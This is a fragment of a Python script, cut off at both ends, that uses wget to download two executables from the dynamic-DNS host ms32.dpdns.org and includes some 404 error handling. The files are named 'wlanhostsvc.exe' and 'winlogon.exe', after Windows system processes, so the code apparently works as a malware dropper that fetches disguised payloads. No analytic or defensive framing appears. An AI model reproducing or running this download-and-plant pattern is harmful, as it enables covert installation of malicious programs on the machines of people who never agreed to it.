...
regdone=False
try:
    fiel = run(["wget","-O",destination_path_exe,"https://ms32.dpdns.org/static/apps/wlanhostsvc.exe"],shell=True,capture_output=True)
    ms32done = True
    if b"ERROR 404: Not Found" in fiel.stderr:
        log(f"Incorrect url {url} for wlanhostsvc.exe",state="FATAL")
        exit(0)
        ms32done = False
    fiel = run(["wget","-O",dest_checker,"https://ms32.dpdns.org/static/apps/winlogon.exe"],shell=True,capture_output=True)
    checkerdone = True
    if b"ERROR 404: Not Found" in fiel.stderr:
